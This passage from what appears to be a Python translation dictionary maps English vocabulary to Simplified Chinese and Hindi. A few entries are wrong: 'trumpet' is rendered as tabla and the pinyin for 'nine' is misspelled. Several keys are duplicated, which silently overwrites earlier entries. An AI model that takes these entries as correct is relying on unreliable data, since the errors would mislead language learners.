                "Chinese (Simplified)": "大本钟 (Dà běn zhōng)",
                "Hindi": "बिग बेन (Big Ben)"
            },
            "christ the redeemer": {
                "Chinese (Simplified)": "基督救世主像 (Jī dū jiù shì zhǔ xiàng)",
                "Hindi": "क्राइस्ट द रिडीमर (Christ the Redeemer)"
            },
            "empire state building": {
                "Chinese (Simplified)": "帝国大厦 (Dì guó dà shà)",
                "Hindi": "एम्पायर स्टेट बिल्डिंग (Empire State Building)"
            },
            "leaning tower of pisa": {
                "Chinese (Simplified)": "比萨斜塔 (Bǐ sà xié tǎ)",
                "Hindi": "पीसा की झुकी हुई मीनार (Pisa ki Jhuki Hui Meenar)"
            },
            "forbidden city": {
                "Chinese (Simplified)": "故宫 (Gù gōng)",
                "Hindi": "निषिद्ध शहर (Nishiddh Shahar)"
            },
            "santorini": {
                "Chinese (Simplified)": "圣托里尼 (Shèng tuō lǐ ní)",
                "Hindi": "सैंटोरिनी (Santorini)"
            },
            "mount fuji": {
                "Chinese (Simplified)": "富士山 (Fù shì shān)",
                "Hindi": "माउंट फूजी (Mount Fuji)"
            },
            "buckingham palace": {
                "Chinese (Simplified)": "白金汉宫 (Bái jīn hàn gōng)",
                "Hindi": "बकिंघम पैलेस (Buckingham Palace)"
            },
            "niagara falls": {
                "Chinese (Simplified)": "尼亚加拉瀑布 (Ní yà jiā lā pù bù)",
                "Hindi": "नियाग्रा फॉल्स (Niagara Falls)"
            },
            "versailles palace": {
                "Chinese (Simplified)": "凡尔赛宫 (Fán ěr sài gōng)",
                "Hindi": "वर्साय पैलेस (Versailles Palace)"
            },
            "i": {
                "Chinese (Simplified)": "我 (wǒ)",
                "Hindi": "मैं (main)"
            },
            "you": {
                "Chinese (Simplified)": "你 (nǐ)",
                "Hindi": "तुम (tum)"
            },
            "he": {
                "Chinese (Simplified)": "他 (tā)",
                "Hindi": "वह (vah)"
            },
            "she": {
                "Chinese (Simplified)": "她 (tā)",
                "Hindi": "वह (vah)"
            },
            "we": {
                "Chinese (Simplified)": "我们 (wǒ men)",
                "Hindi": "हम (ham)"
            },
            "they": {
                "Chinese (Simplified)": "他们 (tā men)",
                "Hindi": "वे (ve)"
            },
            "me": {
                "Chinese (Simplified)": "我 (wǒ)",
                "Hindi": "मुझे (mujhe)"
            },
            "us": {
                "Chinese (Simplified)": "我们 (wǒ men)",
                "Hindi": "हमें (humein)"
            },
            "him": {
                "Chinese (Simplified)": "他 (tā)",
                "Hindi": "उसे (use)"
            },
            "her": {
                "Chinese (Simplified)": "她 (tā)",
                "Hindi": "उसे (use)"
            },
            "my": {
                "Chinese (Simplified)": "我的 (wǒ de)",
                "Hindi": "मेरा (mera)"
            },
            "your": {
                "Chinese (Simplified)": "你的 (nǐ de)",
                "Hindi": "तुम्हारा (tumhara)"
            },
            "his": {
                "Chinese (Simplified)": "他的 (tā de)",
                "Hindi": "उसका (uska)"
            },
            "her": {
                "Chinese (Simplified)": "她的 (tā de)",
                "Hindi": "उसकी (uski)"
            },
            "our": {
                "Chinese (Simplified)": "我们的 (wǒ men de)",
                "Hindi": "हमारा (hamara)"
            },
            "their": {
                "Chinese (Simplified)": "他们的 (tā men de)",
                "Hindi": "उनका (unka)"
            },
            "mine": {
                "Chinese (Simplified)": "我的 (wǒ de)",
                "Hindi": "मेरा (mera)"
            },
            "yours": {
                "Chinese (Simplified)": "你的 (nǐ de)",
                "Hindi": "तुम्हारा (tumhara)"
            },
            "hers": {
                "Chinese (Simplified)": "她的 (tā de)",
                "Hindi": "उसकी (uski)"
            },
            # Days of the Week
            "monday": {
                "Hindi": "सोमवार (Somvār)",
                "Chinese (Simplified)": "星期一 (xīngqī yī)"
            },
            "tuesday": {
                "Hindi": "मंगलवार (Mangalvār)",
                "Chinese (Simplified)": "星期二 (xīngqī èr)"
            },
            "wednesday": {
                "Hindi": "बुधवार (Budhvār)",
                "Chinese (Simplified)": "星期三 (xīngqī sān)"
            },
            "thursday": {
                "Hindi": "गुरुवार (Guruvār)",
                "Chinese (Simplified)": "星期四 (xīngqī sì)"
            },
            "friday": {
                "Hindi": "शुक्रवार (Shukravār)",
                "Chinese (Simplified)": "星期五 (xīngqī wǔ)"
            },
            "saturday": {
                "Hindi": "शनिवार (Shanivār)",
                "Chinese (Simplified)": "星期六 (xīngqī liù)"
            },
            "sunday": {
                "Hindi": "रविवार (Ravivār)",
                "Chinese (Simplified)": "星期天 (xīngqī tiān)"
            },
            # Seasons
            "spring": {
                "Hindi": "वसंत (Vasant)",
                "Chinese (Simplified)": "春天 (chūntiān)"
            },
            "summer": {
                "Hindi": "गर्मी (Garmī)",
                "Chinese (Simplified)": "夏天 (xiàtiān)"
            },
            "autumn": {
                "Hindi": "पतझड़ (Patjhaṛ)",
                "Chinese (Simplified)": "秋天 (qiūtiān)"
            },
            "winter": {
                "Hindi": "सर्दी (Sardī)",
                "Chinese (Simplified)": "冬天 (dōngtiān)"
            },
            "fruit": {
                "Hindi": "फल (phal)",
                "Chinese (Simplified)": "水果 (shuǐguǒ)"
            },
            "tea": {
                "Hindi": "चाय (chāy)",
                "Chinese (Simplified)": "茶 (chá)"
            },
            "see": {
                "Hindi": "देखना (dekhna)",
                "Chinese (Simplified)": "看 (kàn)"
            },
            "speak": {
                "Hindi": "बोलना (bolnā)",
                "Chinese (Simplified)": "说 (shuō)"
            },
            "kid": {
                "Hindi": "बच्चा (bachchā)",
                "Chinese (Simplified)": "孩子 (háizi)"
            },
            "hear": {
                "Hindi": "सुनना (sunnā)",
                "Chinese (Simplified)": "听 (tīng)"
            },
            "sea": {
                "Hindi": "समुद्र (samudra)",
                "Chinese (Simplified)": "海 (hǎi)"
            },
            "wall": {
                "Hindi": "दीवार (dīvār)",
                "Chinese (Simplified)": "墙 (qiáng)"
            },
            "nature": {
                "Hindi": "प्रकृति (prakṛti)",
                "Chinese (Simplified)": "自然 (zìrán)"
            },
            "milk": {
                "Hindi": "दूध (dūdh)",
                "Chinese (Simplified)": "牛奶 (niúnǎi)"
            },
            "air": {
                "Hindi": "हवा (havā)",
                "Chinese (Simplified)": "空气 (kōngqì)"
            },
            "hair": {
                "Hindi": "बाल (bāl)",
                "Chinese (Simplified)": "头发 (tóufǎ)"
            },
            # Weather Conditions
            "sunny": {
                "Hindi": "धूप (Dhūp)",
                "Chinese (Simplified)": "晴天 (qíngtiān)"
            },
            "cloudy": {
                "Hindi": "बादल (Bādal)",
                "Chinese (Simplified)": "多云 (duōyún)"
            },
            "rainy": {
                "Hindi": "बारिश (Bāriś)",
                "Chinese (Simplified)": "下雨 (xià yǔ)"
            },
            "snowy": {
                "Hindi": "बर्फबारी (Barfbarī)",
                "Chinese (Simplified)": "下雪 (xià xuě)"
            },
            "windy": {
                "Hindi": "हवाएँ (Hawāen)",
                "Chinese (Simplified)": "刮风 (guā fēng)"
            },
            "stormy": {
                "Hindi": "आंधी (Āndhī)",
                "Chinese (Simplified)": "风暴 (fēngbào)"
            },
            # Common Phrases
            "how much is this": {
                "Hindi": "यह कितना है? (Yeh kitna hai?)",
                "Chinese (Simplified)": "这个多少钱？ (zhège duōshao qián?)"
            },
            "i don't understand": {
                "Hindi": "मुझे समझ में नहीं आ रहा है (Mujhe samajh mein nahīn ā rahā hai)",
                "Chinese (Simplified)": "我不明白 (wǒ bù míngbái)"
            },
            "can you help me": {
                "Hindi": "क्या आप मेरी मदद कर सकते हैं? (Kya āp merī madad kar sakte hain?)",
                "Chinese (Simplified)": "你能帮我吗？ (nǐ néng bāng wǒ ma?)"
            },
            "what time is it": {
                "Hindi": "समय क्या हुआ है? (Samay kyā huā hai?)",
                "Chinese (Simplified)": "现在几点了？ (xiànzài jǐ diǎn le?)"
            },
            "where is the bathroom": {
                "Hindi": "बाथरूम कहाँ है? (Bāthrūm kahān hai?)",
                "Chinese (Simplified)": "洗手间在哪里？ (xǐshǒujiān zài nǎlǐ?)"
            },
            "i need food/water": {
                "Hindi": "मुझे खाना/पानी चाहिए (Mujhe khānā/pānī chāhiye)",
                "Chinese (Simplified)": "我需要食物/水 (wǒ xūyào shíwù/shuǐ)"
            },
            "i am lost": {
                "Hindi": "मैं खो गया हूँ (Main kho gayā hūn)",
                "Chinese (Simplified)": "我迷路了 (wǒ mílùle)"
            },
            # Time Expressions
            "today": {
                "Hindi": "आज (Āj)",
                "Chinese (Simplified)": "今天 (jīntiān)"
            },
            "tomorrow": {
                "Hindi": "कल (Kal)",
                "Chinese (Simplified)": "明天 (míngtiān)"
            },
            "yesterday": {
                "Hindi": "कल (Kal)",
                "Chinese (Simplified)": "昨天 (zuótiān)"
            },
            "now": {
                "Hindi": "अब (Ab)",
                "Chinese (Simplified)": "现在 (xiànzài)"
            },
            "later": {
                "Hindi": "बाद में (Bād mein)",
                "Chinese (Simplified)": "稍后 (shāo hòu)"
            },
            "soon": {
                "Hindi": "जल्द (Jald)",
                "Chinese (Simplified)": "很快 (hěn kuài)"
            },
            # Objects Around the House
            "table": {
                "Hindi": "मेज (Mēz)",
                "Chinese (Simplified)": "桌子 (zhuōzi)"
            },
            "chair": {
                "Hindi": "कुर्सी (Kursī)",
                "Chinese (Simplified)": "椅子 (yǐzi)"
            },
            "bed": {
                "Hindi": "बिस्तर (Bistar)",
                "Chinese (Simplified)": "床 (chuáng)"
            },
            "tv": {
                "Hindi": "टीवी (TīVī)",
                "Chinese (Simplified)": "电视 (diànshì)"
            },
            "refrigerator": {
                "Hindi": "फ्रिज (Frij)",
                "Chinese (Simplified)": "冰箱 (bīngxiāng)"
            },
            "door": {
                "Hindi": "दरवाज़ा (Darwāzā)",
                "Chinese (Simplified)": "门 (mén)"
            },
            "window": {
                "Hindi": "खिड़की (Khiṛkī)",
                "Chinese (Simplified)": "窗户 (chuānghù)"
            },
            # Emotions/Feelings
            "excited": {
                "Hindi": "उत्साहित (Utsāhit)",
                "Chinese (Simplified)": "兴奋 (xīngfèn)"
            },
            "nervous": {
                "Hindi": "नर्वस (Narvas)",
                "Chinese (Simplified)": "紧张 (jǐnzhāng)"
            },
            "angry": {
                "Hindi": "गुस्से में (Gusse mein)",
                "Chinese (Simplified)": "生气 (shēngqì)"
            },
            "surprised": {
                "Hindi": "हैरान (Hairān)",
                "Chinese (Simplified)": "惊讶 (jīngyà)"
            },
            "bore": {
                "Hindi": "बोर (Bore)",
                "Chinese (Simplified)": "无聊 (wúliáo)"
            },
            "confused": {
                "Hindi": "भ्रमित (Bhramit)",
                "Chinese (Simplified)": "困惑 (kùnhuò)"
            },
            "anxious": {
                "Hindi": "चिंतित (Chintit)",
                "Chinese (Simplified)": "焦虑 (jiāolǜ)"
            },
            "hand": {
                "Hindi": "हाथ (haath)",
                "Chinese (Simplified)": "手 (shǒu)"
            },
            "leg": {
                "Hindi": "टांग (taang)",
                "Chinese (Simplified)": "腿 (tuǐ)"
            },
            "nose": {
                "Hindi": "नाक (naak)",
                "Chinese (Simplified)": "鼻子 (bízi)"
            },
            "mouth": {
                "Hindi": "मुंह (munh)",
                "Chinese (Simplified)": "嘴巴 (zuǐba)"
            },
            "ear": {
                "Hindi": "कान (kaan)",
                "Chinese (Simplified)": "耳朵 (ěrduo)"
            },
            "heart": {
                "Hindi": "दिल (dil)",
                "Chinese (Simplified)": "心脏 (xīnzàng)"
            },
            "stomach": {
                "Hindi": "पेट (pet)",
                "Chinese (Simplified)": "胃 (wèi)"
            },
            "head": {
                "Hindi": "सिर (sir)",
                "Chinese (Simplified)": "头 (tóu)"
            },
            "brain": {
                "Hindi": "मस्तिष्क (mastishk)",
                "Chinese (Simplified)": "大脑 (dànǎo)"
            },
            "uncle": {
                "Hindi": "चाचा/फूफा (chacha/fufa)",
                "Chinese (Simplified)": "叔叔 (shūshu)"
            },
            "aunt": {
                "Hindi": "चाची/फूफी (chachi/foofi)",
                "Chinese (Simplified)": "阿姨 (āyí)"
            },
            "son": {
                "Hindi": "पुत्र (putra)",
                "Chinese (Simplified)": "儿子 (érzi)"
            },
            "daughter": {
                "Hindi": "बेटी (beti)",
                "Chinese (Simplified)": "女儿 (nǚ'ér)"
            },
            "grandfather": {
                "Hindi": "दादा/नाना (dada/nana)",
                "Chinese (Simplified)": "祖父 (zǔfù)"
            },
            "grandmother": {
                "Hindi": "दादी/नानी (daadi/naani)",
                "Chinese (Simplified)": "祖母 (zǔmǔ)"
            },
            "car": {
            "Hindi": "कार (kaar)",
            "Chinese (Simplified)": "汽车 (qìchē)"
            },
            "bus": {
                "Hindi": "बस (bas)",
                "Chinese (Simplified)": "公共汽车 (gōnggòng qìchē)"
            },
            "train": {
                "Hindi": "ट्रेन (train)",
                "Chinese (Simplified)": "火车 (huǒchē)"
            },
            "bicycle": {
                "Hindi": "साइकिल (saikil)",
                "Chinese (Simplified)": "自行车 (zìxíngchē)"
            },
            "airplane": {
                "Hindi": "विमान (viman)",
                "Chinese (Simplified)": "飞机 (fēijī)"
            },
            "ship": {
                "Hindi": "जहाज (jahaz)",
                "Chinese (Simplified)": "船 (chuán)"
            },
            "motorcycle": {
                "Hindi": "मोटरसाइकिल (motorcycle)",
                "Chinese (Simplified)": "摩托车 (mótuōchē)"
            },
            "helicopter": {
                "Hindi": "हेलिकॉप्टर (helicopter)",
                "Chinese (Simplified)": "直升机 (zhíshēngjī)"
            },
            "boat": {
                "Hindi": "नौका (nauka)",
                "Chinese (Simplified)": "船 (chuán)"
            },
            "truck": {
                "Hindi": "ट्रक (truck)",
                "Chinese (Simplified)": "卡车 (kǎchē)"
            },
            "pizza": {
            "Hindi": "पिज़्ज़ा (pizza)",
            "Chinese (Simplified)": "比萨 (bǐsà)"
            },
            "burger": {
                "Hindi": "बर्गर (burger)",
                "Chinese (Simplified)": "汉堡 (hànbǎo)"
            },
            "pasta": {
                "Hindi": "पास्ता (pasta)",
                "Chinese (Simplified)": "意大利面 (yìdàlì miàn)"
            },
            "noodles": {
                "Hindi": "नूडल्स (noodles)",
                "Chinese (Simplified)": "面条 (miàntiáo)"
            },
            "salad": {
                "Hindi": "सलाद (salaad)",
                "Chinese (Simplified)": "沙拉 (shālā)"
            },
            "ice cream": {
                "Hindi": "आइस क्रीम (ice cream)",
                "Chinese (Simplified)": "冰淇淋 (bīngqílín)"
            },
            "cake": {
                "Hindi": "केक (cake)",
                "Chinese (Simplified)": "蛋糕 (dàngāo)"
            },
            "juice": {
                "Hindi": "जूस (juice)",
                "Chinese (Simplified)": "果汁 (guǒzhī)"
            },
            "coffee": {
                "Hindi": "कॉफ़ी (coffee)",
                "Chinese (Simplified)": "咖啡 (kāfēi)"
            },
            "tea": {
                "Hindi": "चाय (chaay)",
                "Chinese (Simplified)": "茶 (chá)"
            },
            "run": {
            "Hindi": "दौड़ना (daudna)",
            "Chinese (Simplified)": "跑 (pǎo)"
            },
            "walk": {
                "Hindi": "चलना (chalna)",
                "Chinese (Simplified)": "走 (zǒu)"
            },
            "eat": {
                "Hindi": "खाना (khana)",
                "Chinese (Simplified)": "吃 (chī)"
            },
            "sleep": {
                "Hindi": "सोना (sona)",
                "Chinese (Simplified)": "睡觉 (shuìjiào)"
            },
            "jump": {
                "Hindi": "कूदना (koodna)",
                "Chinese (Simplified)": "跳 (tiào)"
            },
            "laugh": {
                "Hindi": "हँसना (hansna)",
                "Chinese (Simplified)": "笑 (xiào)"
            },
            "cry": {
                "Hindi": "रोना (rona)",
                "Chinese (Simplified)": "哭 (kū)"
            },
            "read": {
                "Hindi": "पढ़ना (padhna)",
                "Chinese (Simplified)": "读 (dú)"
            },
            "write": {
                "Hindi": "लिखना (likhna)",
                "Chinese (Simplified)": "写 (xiě)"
            },
            "sing": {
                "Hindi": "गाना (gana)",
                "Chinese (Simplified)": "唱 (chàng)"
            },
            "circle": {
            "Hindi": "वृत्त (vritt)",
            "Chinese (Simplified)": "圆形 (yuánxíng)"
            },
            "square": {
                "Hindi": "वर्ग (varg)",
                "Chinese (Simplified)": "正方形 (zhèngfāngxíng)"
            },
            "triangle": {
                "Hindi": "त्रिकोण (trikon)",
                "Chinese (Simplified)": "三角形 (sānjiǎoxíng)"
            },
            "rectangle": {
                "Hindi": "आयत (ayat)",
                "Chinese (Simplified)": "矩形 (jǔxíng)"
            },
            "oval": {
                "Hindi": "अंडाकार (andakaar)",
                "Chinese (Simplified)": "椭圆形 (tuǒyuánxíng)"
            },
            "star": {
                "Hindi": "तारा (tara)",
                "Chinese (Simplified)": "星星 (xīngxing)"
            },
            "heart": {
                "Hindi": "दिल (dil)",
                "Chinese (Simplified)": "心形 (xīn xíng)"
            },
            "diamond": {
                "Hindi": "हीरा (heera)",
                "Chinese (Simplified)": "钻石 (zuànshí)"
            },
            "pentagon": {
                "Hindi": "पेंटागन (pentagon)",
                "Chinese (Simplified)": "五边形 (wǔbiānxíng)"
            },
            "hexagon": {
                "Hindi": "षटकोण (shatkona)",
                "Chinese (Simplified)": "六边形 (liùbiānxíng)"
            },
            # 5. **Natural Elements**
            "earth": {
                "Hindi": "पृथ्वी (prithvi)",
                "Chinese (Simplified)": "地球 (dìqiú)"
            },
            "water": {
                "Hindi": "पानी (paani)",
                "Chinese (Simplified)": "水 (shuǐ)"
            },
            "fire": {
                "Hindi": "आग (aag)",
                "Chinese (Simplified)": "火 (huǒ)"
            },
            "air": {
                "Hindi": "हवा (hawa)",
                "Chinese (Simplified)": "空气 (kōngqì)"
            },
            "light": {
                "Hindi": "रोशनी (roshni)",
                "Chinese (Simplified)": "光 (guāng)"
            },
            "dark": {
                "Hindi": "अंधेरा (andhera)",
                "Chinese (Simplified)": "黑暗 (hēi'àn)"
            },
            # 8. **Instruments (Musical)**
            "guitar": {
                "Hindi": "गिटार (guitar)",
                "Chinese (Simplified)": "吉他 (jítā)"
            },
            "piano": {
                "Hindi": "पियानो (piyano)",
                "Chinese (Simplified)": "钢琴 (gāngqín)"
            },
            "drums": {
                "Hindi": "ढोल (dhol)",
                "Chinese (Simplified)": "鼓 (gǔ)"
            },
            "violin": {
                "Hindi": "वायोलिन (violin)",
                "Chinese (Simplified)": "小提琴 (xiǎotíqín)"
            },
            "flute": {
                "Hindi": "बांसुरी (bansuri)",
                "Chinese (Simplified)": "长笛 (chángdí)"
            },
            "trumpet": {
                "Hindi": "तबला (tabla)",
                "Chinese (Simplified)": "小号 (xiǎo hào)"
            },
            # 9. **Occupations**
            "teacher": {
                "Hindi": "शिक्षक (shikshak)",
                "Chinese (Simplified)": "老师 (lǎoshī)"
            },
            "doctor": {
                "Hindi": "डॉक्टर (doctor)",
                "Chinese (Simplified)": "医生 (yīshēng)"
            },
            "engineer": {
                "Hindi": "इंजीनियर (engineer)",
                "Chinese (Simplified)": "工程师 (gōngchéngshī)"
            },
            "lawyer": {
                "Hindi": "वकील (vakil)",
                "Chinese (Simplified)": "律师 (lǜshī)"
            },
            "artist": {
                "Hindi": "कला कलाकार (kala kalakar)",
                "Chinese (Simplified)": "艺术家 (yìshùjiā)"
            },
            "scientist": {
                "Hindi": "वैज्ञानिक (vaigyanik)",
                "Chinese (Simplified)": "科学家 (kēxuéjiā)"
            },
            # 11. **Months of the Year**
            "january": {
                "Hindi": "जनवरी (janvari)",
                "Chinese (Simplified)": "一月 (yī yuè)"
            },
            "february": {
                "Hindi": "फरवरी (farvari)",
                "Chinese (Simplified)": "二月 (èryuè)"
            },
            "march": {
                "Hindi": "मार्च (maarch)",
                "Chinese (Simplified)": "三月 (sān yuè)"
            },
            "april": {
                "Hindi": "अप्रैल (aprail)",
                "Chinese (Simplified)": "四月 (sì yuè)"
            },
            "may": {
                "Hindi": "मई (mai)",
                "Chinese (Simplified)": "五月 (wǔ yuè)"
            },
            "june": {
                "Hindi": "जून (june)",
                "Chinese (Simplified)": "六月 (liù yuè)"
            },
            "july": {
                "Hindi": "जुलाई (julaai)",
                "Chinese (Simplified)": "七月 (qī yuè)"
            },
            "august": {
                "Hindi": "अगस्त (agast)",
                "Chinese (Simplified)": "八月 (bā yuè)"
            },
            "september": {
                "Hindi": "सितंबर (sitamber)",
                "Chinese (Simplified)": "九月 (jiǔ yuè)"
            },
            "october": {
                "Hindi": "अक्टूबर (aktoobar)",
                "Chinese (Simplified)": "十月 (shí yuè)"
            },
            "november": {
                "Hindi": "नवंबर (navambar)",
                "Chinese (Simplified)": "十一月 (shíyī yuè)"
            },
            "december": {
                "Hindi": "दिसंबर (disambar)",
                "Chinese (Simplified)": "十二月 (shí'èr yuè)"
            },
            # 12. **Types of Trees**
            "oak": {
                "Hindi": "बलूत का पेड़ (baloot ka ped)",
                "Chinese (Simplified)": "橡树 (xiàng shù)"
            },
            "pine": {
                "Hindi": "देवदार का पेड़ (devdaar ka ped)",
                "Chinese (Simplified)": "松树 (sōng shù)"
            },
            "maple": {
                "Hindi": "मेपल (maple)",
                "Chinese (Simplified)": "枫树 (fēng shù)"
            },
            "birch": {
                "Hindi": "बर्च (birch)",
                "Chinese (Simplified)": "桦树 (huà shù)"
            },
            "willow": {
                "Hindi": "विलो (willow)",
                "Chinese (Simplified)": "柳树 (liǔ shù)"
            },
            "cherry": {
                "Hindi": "चेरी (cherry)",
                "Chinese (Simplified)": "樱桃 (yīngtáo)"
            },
            # 13. **Types of Flowers**
            "rose": {
                "Hindi": "गुलाब (gulaab)",
                "Chinese (Simplified)": "玫瑰 (méiguī)"
            },
            "tulip": {
                "Hindi": "ट्यूलिप (tulip)",
                "Chinese (Simplified)": "郁金香 (yù jīn xiāng)"
            },
            "lily": {
                "Hindi": "लिली (lily)",
                "Chinese (Simplified)": "百合 (bǎihé)"
            },
            "sunflower": {
                "Hindi": "सूरजमुखी (soorajmukhi)",
                "Chinese (Simplified)": "向日葵 (xiàngrìkuí)"
            },
            "daisy": {
                "Hindi": "डेज़ी (daisy)",
                "Chinese (Simplified)": "雏菊 (chújú)"
            },
            "orchid": {
                "Hindi": "आर्किड (orchid)",
                "Chinese (Simplified)": "兰花 (lánhuā)"
            },
            #Numbers
            "one": {
                "Hindi": "एक (ek)",
                "Chinese (Simplified)": "一 (yī)"
            },
            "two": {
                "Hindi": "दो (do)",
                "Chinese (Simplified)": "二 (èr)"
            },
            "three": {
                "Hindi": "तीन (tīn)",
                "Chinese (Simplified)": "三 (sān)"
            },
            "four": {
                "Hindi": "चार (chār)",
                "Chinese (Simplified)": "四 (sì)"
            },
            "five": {
                "Hindi": "पाँच (pāँch)",
                "Chinese (Simplified)": "五 (wǔ)"
            },
            "six": {
                "Hindi": "छे (che)",
                "Chinese (Simplified)": "六 (liù)"
            },
            "seven": {
                "Hindi": "सात (sāt)",
                "Chinese (Simplified)": "七 (qī)"
            },
            "eight": {
                "Hindi": "आठ (aaṭ)",
                "Chinese (Simplified)": "八 (bā)"
            },
            "nine": {
                "Hindi": "नौ (nau)",
                "Chinese (Simplified)": "九 (jiǒu)"
            },
            "ten": {
                "Hindi": "दस (das)",
                "Chinese (Simplified)": "十 (shí)"
            },
            "okay": {
                "Hindi": "ठीक (ṭhīk)",
                "Chinese (Simplified)": "好 (hǎo)"
            },
            "wrong": {
                "Hindi": "गलत (galat)",
                "Chinese (Simplified)": "错 (cuò)"
            },
            "lock": {
                "Hindi": "ताला (tālā)",
                "Chinese (Simplified)": "锁 (suǒ)"
            },
            "broom": {
                "Hindi": "झाड़ू (jhāṛū)",
                "Chinese (Simplified)": "扫帚 (sàozhǒu)"
            },
            "knife": {
                "Hindi": "चाकू (cākū)",
                "Chinese (Simplified)": "刀 (dāo)"
            },
            "groom": {
                "Hindi": "दूल्हा (dūlhā)",
                "Chinese (Simplified)": "新郎 (xīnláng)"
            },
            "bride": {
                "Hindi": "दुल्हन (dulhan)",
                "Chinese (Simplified)": "新娘 (xīnniáng)"
            },
            "tray": {
                "Hindi": "थाली (thālī)",
                "Chinese (Simplified)": "托盘 (tuōpán)"
            },
            "gun": {
                "Hindi": "बंदूक (bandūk)",
                "Chinese (Simplified)": "枪 (qiāng)"
            },
            "steam": {
                "Hindi": "भाप (bhāp)",
                "Chinese (Simplified)": "蒸汽 (zhēngqì)"
            },
            "box": {
                "Hindi": "डिब्बा (ḍibbā)",
                "Chinese (Simplified)": "盒子 (hézi)"
            },
            "total": {
                "Hindi": "कुल (kul)",
                "Chinese (Simplified)": "总计 (zǒngjì)"
            },
            "end": {
                "Hindi": "अंत (ant)",
                "Chinese (Simplified)": "结束 (jiéshù)"
            },
            "search": {
                "Hindi": "खोज (khoj)",
                "Chinese (Simplified)": "搜索 (sōusuǒ)"
            },
            "line": {
                "Hindi": "रेखा (rekhā)",
                "Chinese (Simplified)": "线 (xiàn)"
            },
            "sphere": {
                "Hindi": "गोला (golā)",
                "Chinese (Simplified)": "球体 (qiútǐ)"
            },
            "space": {
                "Hindi": "अंतरिक्ष (antarikṣ)",
                "Chinese (Simplified)": "空间 (kōngjiān)"
            },
            "seat": {
                "Hindi": "सीट (sīṭ)",
                "Chinese (Simplified)": "座位 (zuòwèi)"
            },
            "straight": {
                "Hindi": "सीधा (sīdhā)",
                "Chinese (Simplified)": "直的 (zhí de)"
            },
            "beautiful": {
                "Hindi": "सुंदर (sundar)",
                "Chinese (Simplified)": "美丽 (měilì)"
            },
            "ugly": {
                "Hindi": "बदसूरत (badsūrat)",
                "Chinese (Simplified)": "丑陋 (chǒulòu)"
            },
            "truth": {
                "Hindi": "सत्य (satya)",
                "Chinese (Simplified)": "真相 (zhēnxiàng)"
            },
            "lie": {
                "Hindi": "झूठ (jhūṭh)",
                "Chinese (Simplified)": "谎言 (huǎngyán)"
            },
            "lean": {
                "Hindi": "झुकना (jhuknā)",
                "Chinese (Simplified)": "倾斜 (qīngxié)"
            },
            "stand": {
                "Hindi": "खड़ा होना (khaḍā honā)",
                "Chinese (Simplified)": "站立 (zhànlì)"
            },
            "sit": {
                "Hindi": "बैठना (baiṭhnā)",
                "Chinese (Simplified)": "坐下 (zuòxià)"
            },
            "solve": {
                "Hindi": "सुलझाना (suljhanā)",
                "Chinese (Simplified)": "解决 (jiějué)"
            },
            "broke": {
                "Hindi": "टूट गया (ṭūṭ gayā)",
                "Chinese (Simplified)": "破了 (pò le)"
            },
            "break": {
                "Hindi": "तोड़ना (toṛnā)",
                "Chinese (Simplified)": "打破 (dǎpò)"
            },
            "suck": {
                "Hindi": "चूसना (chūsna)",
                "Chinese (Simplified)": "吸 (xī)"
            },
            "weight": {
                "Hindi": "वजन (vajan)",
                "Chinese (Simplified)": "重量 (zhòngliàng)"
            },
            "thin": {
                "Hindi": "पतला (patlā)",
                "Chinese (Simplified)": "瘦 (shòu)"
            },
            "villain": {
                "Hindi": "खलनायक (khalnāyak)",
                "Chinese (Simplified)": "反派 (fǎnpài)"
            },
            "thick": {
                "Hindi": "मोटा (moṭā)",
                "Chinese (Simplified)": "厚 (hòu)"
            },
            "male": {
                "Hindi": "पुरुष (puruṣ)",
                "Chinese (Simplified)": "男性 (nánxìng)"
            },
            "female": {
                "Hindi": "महिला (mahilā)",
                "Chinese (Simplified)": "女性 (nǚxìng)"
            },
            "galaxy": {
                "Hindi": "आकाशगंगा (ākāshgaṅgā)",
                "Chinese (Simplified)": "银河系 (yínhéxì)"
            },
            "star": {
                "Hindi": "तारा (tārā)",
                "Chinese (Simplified)": "星 (xīng)"
            },
            "drop": {
                "Hindi": "गिरना (girnā)",
                "Chinese (Simplified)": "掉落 (diàoluò)"
            },
            "catch": {
                "Hindi": "पकड़ना (pakaṛnā)",
                "Chinese (Simplified)": "抓住 (zhuāzhù)"
            },
            "take": {
                "Hindi": "लेना (lenā)",
                "Chinese (Simplified)": "拿 (ná)"
            },
            "throw": {
                "Hindi": "फेंकना (pheṅknā)",
                "Chinese (Simplified)": "扔 (rēng)"
            },
            "talk": {
                "Hindi": "बात करना (bāt karnā)",
                "Chinese (Simplified)": "谈话 (tánhuà)"
            },
            "share": {
                "Hindi": "साझा करना (sājhā karnā)",
                "Chinese (Simplified)": "分享 (fēnxiǎng)"
            },
            "professional": {
                "Hindi": "पेशेवर (peshevar)",
                "Chinese (Simplified)": "专业的 (zhuānyè de)"
            },
            "expert": {
                "Hindi": "विशेषज्ञ (viśeṣajña)",
                "Chinese (Simplified)": "专家 (zhuānjiā)"
            },
            "noob": {
                "Hindi": "नौसिखिया (nausikhiyā)",
                "Chinese (Simplified)": "菜鸟 (càiniǎo)"
            },
            "true": {
                "Hindi": "सच (sach)",
                "Chinese (Simplified)": "真实 (zhēnshí)"
            },
            "false": {
                "Hindi": "झूठा (jhūṭhā)",
                "Chinese (Simplified)": "虚假 (xūjiǎ)"
            },
            "board": {
                "Hindi": "पट्टिका (paṭṭikā)",
                "Chinese (Simplified)": "板 (bǎn)"
            },
            "speed": {
                "Hindi": "गति (gati)",
                "Chinese (Simplified)": "速度 (sùdù)"
            },
            "release": {
                "Hindi": "जारी करना (jārī karnā)",
                "Chinese (Simplified)": "释放 (shìfàng)"
            },
            "limit": {
                "Hindi": "सीमा (sīmā)",
                "Chinese (Simplified)": "限制 (xiànzhì)"
            },
            "loss": {
                "Hindi": "हानि (hāni)",
                "Chinese (Simplified)": "损失 (sǔnshī)"
            },
            "lost": {
                "Hindi": "खो गया (kho gayā)",
                "Chinese (Simplified)": "迷失 (míshī)"
            },
            "found": {
                "Hindi": "मिला (milā)",
                "Chinese (Simplified)": "找到 (zhǎodào)"
            },
            "find": {
                "Hindi": "ढूंढना (ḍhūṇḍhnā)",
                "Chinese (Simplified)": "寻找 (xúnzhǎo)"
            },
            "color": {
                "Hindi": "रंग (raṅg)",
                "Chinese (Simplified)": "颜色 (yánsè)"
            },
            "check": {
                "Hindi": "जांचना (jānchnā)",
                "Chinese (Simplified)": "检查 (jiǎnchá)"
            },
            "question": {
                "Hindi": "प्रश्न (praśn)",
                "Chinese (Simplified)": "问题 (wèntí)"
            },
            "answer": {
                "Hindi": "उत्तर (uttar)",
                "Chinese (Simplified)": "答案 (dáàn)"
